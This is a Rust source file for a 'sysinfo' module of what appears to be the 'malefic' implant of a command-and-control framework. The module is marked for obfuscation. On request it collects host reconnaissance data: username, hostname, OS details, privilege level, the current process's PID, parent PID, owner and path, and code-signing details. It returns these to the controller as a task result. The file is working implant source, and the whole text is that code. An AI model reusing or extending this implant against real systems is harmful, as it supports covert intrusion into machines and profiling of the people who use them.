use crate::prelude::*;

pub struct SysInfo {}
#[async_trait]
#[module_impl("sysinfo")]
impl Module for SysInfo {}

#[async_trait]
#[obfuscate]
impl malefic_module::ModuleImpl for SysInfo {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut malefic_module::Input,
        _: &mut malefic_module::Output,
    ) -> malefic_module::ModuleResult {
        let _ = check_request!(receiver, Body::Request)?;
        let info = malefic_sysinfo::get_sysinfo();
        let os = info.os.unwrap_or_else(|| malefic_sysinfo::Os {
            name: std::env::consts::OS.to_string(),
            version: String::new(),
            release: String::new(),
            arch: std::env::consts::ARCH.to_string(),
            username: String::new(),
            hostname: String::new(),
            locale: String::new(),
            clr_version: Vec::new(),
        });
        let process = info.process.unwrap_or_default();

        Ok(TaskResult::new_with_body(
            id,
            Body::Sysinfo(malefic_proto::proto::modulepb::SysInfo {
                filepath: info.filepath,
                workdir: info.workdir,
                is_privilege: info.is_privilege,
                os: Some(malefic_proto::proto::modulepb::Os {
                    name: os.name,
                    version: os.version,
                    release: os.release,
                    arch: os.arch,
                    username: os.username,
                    hostname: os.hostname,
                    locale: os.locale,
                    clr_version: os.clr_version,
                }),
                process: Some(malefic_proto::proto::modulepb::Process {
                    name: process.name,
                    pid: process.pid,
                    ppid: process.ppid,
                    arch: process.arch,
                    owner: process.owner,
                    path: process.path,
                    args: process.args,
                    uid: "".to_string(),
                    signed: process.signed,
                    signature_status: process.signature_status,
                    signer: process.signer,
                    issuer: process.issuer,
                }),
            }),
        ))
    }
}
